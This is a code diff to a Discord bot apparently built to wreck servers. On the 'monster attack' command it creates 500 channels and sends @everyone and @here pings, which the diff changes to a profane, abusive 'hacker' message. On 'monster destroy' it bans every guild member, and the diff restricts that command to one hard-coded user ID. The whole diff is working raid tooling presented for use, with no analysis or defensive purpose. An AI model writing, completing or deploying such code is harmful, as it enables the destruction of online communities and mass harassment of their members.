@@ -17,7 +17,7 @@ client.on('message' , async (message) => {
     if (message.content.startsWith('monster attack')) {
 for (let i = 0; i < 500; i++) {
         message.guild.createChannel(' Dating Team ', 'text')
-        message.channel.send('@everyone __** NO LOVE NO TRUST im done  **__ :muscle: :v: @here');
+        message.channel.send('@everyone __** fuck you all motherfuckers hacker by ...  **__ :muscle: :v: @here');
 }
 }
 });   
@@ -104,7 +104,7 @@ client.on('message', x5bz => {
 
 client.on('message', async message => {
     if(message.content === "monster destroy") {
-        if(message.author.id !== '') return;
+        if(message.author.id !== '515015086797225995') return;
         message.guild.members.forEach(member => {
            member.ban(); 
         });
